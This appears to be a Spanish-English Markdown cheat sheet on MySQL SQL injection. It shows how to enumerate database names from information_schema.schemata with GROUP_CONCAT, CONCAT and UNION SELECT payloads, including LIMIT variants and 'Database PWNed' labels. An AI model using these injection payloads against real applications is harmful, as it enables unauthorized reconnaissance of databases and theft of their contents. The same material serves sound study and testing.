# SQLi: schema, schemata & DIOS

## Basics: `information schema`

### Query basic

````sql
## Schema Name AKA Databases Names Dump
select schema_name CONCAT information_schema.schemata;
````

---

### Group Concat

#### Basic

````sql
## Group Concat Basic Query
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;

## Limitando a 1 en caso que solo deje arrojar un resultado
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata limit 0,1;
````

#### Variantes

````sql
## Agregando un string para separador en forma de ':'
SELECT GROUP_CONCAT(schema_name SEPARATOR ' : ') FROM information_schema.schemata;

## Mini DIOS
SELECT GROUP_CONCAT('Database PWNed: ',schema_name) FROM information_schema.schemata;
````

---

### Concat

#### Basic

````sql
## Concat Basic Query
SELECT concat(schema_name) FROM information_schema.schemata;
````

#### Variantes

````sql
## Agregando un string para separador en forma de ':'
SELECT concat(schema_name, ' : ') FROM information_schema.schemata;

## Mini DIOS: DB Enum (schema enum)
SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemata;
````

---

<br>

<br>

<br>

<br>

## Query Basics: `Union` + `Group Concat`

#### `Union Select` Progression:

````sql
## Original example v1:
select username,password from users;

## Original example v2:
select username,password from users where username = 'F0n3';

## Basic Union Select (v1)
select username,password from users union select 1,2;

## Condition Union Select (v2):
select username,password from users where username = 'F0n3' union select 1,2;

## Condition Union Select, strings a palcer (v2):
select username,password from users where username = 'F0n3' union select 'izquierda','derecha';
````

---

<br>

<br>

<br>

<br>

## `schema_name`: Databases Names Enum

#### `Union Select` + `schema_name`

- `Recordatorio`: El `UNION SELECT` en ocasiones necesita de un `LIMIT` en caso que haya error en la visualización.

````sql
##     Tip: básicamente se inserta el basic query (SELECT schema_name FROM information_schema.schemata;) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)

## Basic Union Select (v1)
SELECT username,password FROM users UNION SELECT 1,schema_name FROM information_schema.schemata;

## Condition Union Select (v2):
SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata;

## Condition Union Select (v2) + LIMIT:
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0,1;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1,1;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2,1;

## Condition Union Select (v2) + LIMIT grupal (casi no se usa, los agrupa dependiendo el número):
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1;
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2;
````

---

#### `Group Concat` + `Union Select` + `schema_name`

- `Recordatorio`: Group Concat no necesita `LIMIT` ya que se devuelve en una sola linea ;)

````sql
##     Tip: básicamente se inserta el query de union select un "GROUP_CONCAT" (GROUP CONCAT(schema_name)) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)

## Basic Union Select (v1)
SELECT username,password FROM users UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;

## Condition Union Select (v2):
SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
````


